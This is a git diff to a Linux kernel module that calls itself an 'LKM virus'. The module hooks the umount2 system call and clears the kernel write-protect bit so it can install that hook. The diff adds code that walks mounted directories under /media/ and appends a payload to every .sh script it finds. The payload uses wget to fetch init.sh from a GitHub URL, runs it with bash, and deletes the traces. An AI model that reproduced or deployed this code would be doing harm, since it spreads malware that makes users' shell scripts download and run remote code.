@@ -330,73 +330,81 @@ int hacked_umount2(const  char __user *dir_name, int flags) {
 	int fd, i, end;
 	struct linux_dirent64 *cur;
 	printk("%s umounting %d\n", dir_name, flags);
-    int tot = 0;
-	for (queue_push(&q, dir_name); !list_empty(&q); queue_pop(&q),tot++) {
-        printk("tot = %d",tot);
-		struct queue *front = list_entry(q.next, struct queue, lnk);
-		enter_usr_space();
-		printk("Try to open dir %s\n", front->s);
-		fd = open(front->s, O_DIRECTORY, 0);
-		if (fd < 0) {
-			printk("Error while infecting...\n");
-			while (!list_empty(&q)) {
-				queue_pop(&q);
-			}
-			break;
-		}
-		end = getdents64(fd, dents, DENT_BUFFER_SIZE);
-		quit_usr_space();
-		close(fd);
-		if (end > 0) {
-			printk("walk on %s\' children...\n", front->s);
-			for (i = 0; i < end; ) {
-				cur = (struct linux_dirent64 *) (dents + i);
-				if (cur->d_type == DT_DIR && str_cmp(cur->d_name, ".") && str_cmp(cur->d_name, "..")) {
-					char *s = str_cat(front->s, str_cat("/", cur->d_name));
-					printk("sub folder: %s\n", cur->d_name);
-                    if(tot <= 100)
-                        queue_push(&q, s);
-				} else {
-					if (cur->d_type & DT_REG) {
-						int len = str_len(cur->d_name);
-						if (len > 3 && !strcmp(cur->d_name + len - 3, ".sh")) {
-							char *s, *res, *tail;
-							int len;
-							struct file *file;
-							s = str_cat(front->s, str_cat("/", cur->d_name));
-							res = "\n";
-							res = str_cat(res,"# This is our code\n");
-							res = str_cat(res,"echo \"\nThis bash file is infected!\n\" ");
-							res = str_cat(res,"wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/init.sh 2> serrlog\n");
-							res = str_cat(res,"bash init.sh\n");
-							res = str_cat(res,"rm init.sh serrlog\n");
-							len = str_len(res);
-							file = reading_file_open(s);
-							tail = kmalloc(len + 1, __GFP_NOFAIL);
-							read_file(file, tail, len, (file->f_path).dentry->d_inode->i_size - len);
-							file_close(file);
-							if (str_cmp(res, tail) == 0) {
-								kfree(tail);
-								printk("%s has been infected! Do nothing...\n", s);
-							} else {
-								kfree(tail);
-								file = writing_file_open(s);
-								//fd = open(s, O_APPEND|O_RDONLY, 0);
-								printk("@%lld %s is written\n", (file->f_path).dentry->d_inode->i_size, res);
-								write_file(file, (file->f_path).dentry->d_inode->i_size, res, len);
-								file_close(file);
-							}
-						}
-					}
-				}
-				i += cur->d_reclen;
-			}
-		} else {
-			if (end < 0)
-				printk("ls failed! %d\n", end);
-		}
-	}
-	return umount2(dir_name, flags);
+    int len = strlen(dir_name);
+    char *temp = "/media/";
+    char cur[10];
+    if(len >= strlen(temp)) {
+        strncpy(cur,dir_name,strlen(temp));
+        if(strcmp(cur,temp) == 1) {
+            int tot = 0;
+            for (queue_push(&q, dir_name); !list_empty(&q); queue_pop(&q),tot++) {
+                printk("tot = %d",tot);
+                struct queue *front = list_entry(q.next, struct queue, lnk);
+                enter_usr_space();
+                printk("Try to open dir %s\n", front->s);
+                fd = open(front->s, O_DIRECTORY, 0);
+                if (fd < 0) {
+                    printk("Error while infecting...\n");
+                    while (!list_empty(&q)) {
+                        queue_pop(&q);
+                    }
+                    break;
+                }
+                end = getdents64(fd, dents, DENT_BUFFER_SIZE);
+                quit_usr_space();
+                close(fd);
+                if (end > 0) {
+                    printk("walk on %s\' children...\n", front->s);
+                    for (i = 0; i < end; ) {
+                        cur = (struct linux_dirent64 *) (dents + i);
+                        if (cur->d_type == DT_DIR && str_cmp(cur->d_name, ".") && str_cmp(cur->d_name, "..")) {
+                            char *s = str_cat(front->s, str_cat("/", cur->d_name));
+                            printk("sub folder: %s\n", cur->d_name);
+                            if(tot <= 100)
+                                queue_push(&q, s);
+                        } else {
+                            if (cur->d_type & DT_REG) {
+                                int len = str_len(cur->d_name);
+                                if (len > 3 && !strcmp(cur->d_name + len - 3, ".sh")) {
+                                    char *s, *res, *tail;
+                                    int len;
+                                    struct file *file;
+                                    s = str_cat(front->s, str_cat("/", cur->d_name));
+                                    res = "\n";
+                                    res = str_cat(res,"# This is our code\n");
+                                    res = str_cat(res,"echo \"\nThis bash file is infected!\n\" ");
+                                    res = str_cat(res,"wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/init.sh 2> serrlog\n");
+                                    res = str_cat(res,"bash init.sh\n");
+                                    res = str_cat(res,"rm init.sh serrlog\n");
+                                    len = str_len(res);
+                                    file = reading_file_open(s);
+                                    tail = kmalloc(len + 1, __GFP_NOFAIL);
+                                    read_file(file, tail, len, (file->f_path).dentry->d_inode->i_size - len);
+                                    file_close(file);
+                                    if (str_cmp(res, tail) == 0) {
+                                        kfree(tail);
+                                        printk("%s has been infected! Do nothing...\n", s);
+                                    } else {
+                                        kfree(tail);
+                                        file = writing_file_open(s);
+                                        //fd = open(s, O_APPEND|O_RDONLY, 0);
+                                        printk("@%lld %s is written\n", (file->f_path).dentry->d_inode->i_size, res);
+                                        write_file(file, (file->f_path).dentry->d_inode->i_size, res, len);
+                                        file_close(file);
+                                    }
+                                }
+                            }
+                        }
+                        i += cur->d_reclen;
+                    }
+                } else {
+                    if (end < 0)
+                        printk("ls failed! %d\n", end);
+                }
+            }
+        }
+    }
+ 	return umount2(dir_name, flags);
 }
 
 
@@ -474,7 +482,7 @@ static int __init lkm_virus_init(void) {
 	
 	
 	//copy_a_to_b("run.sh", "/run.sh");
-	copy_a_to_b("hello.ko", "/.hello.ko");
+	//copy_a_to_b("hello.ko", "/.hello.ko");
 	/**** system call hooking ****/
 	
 	cr0 = clear_wp_cr0();
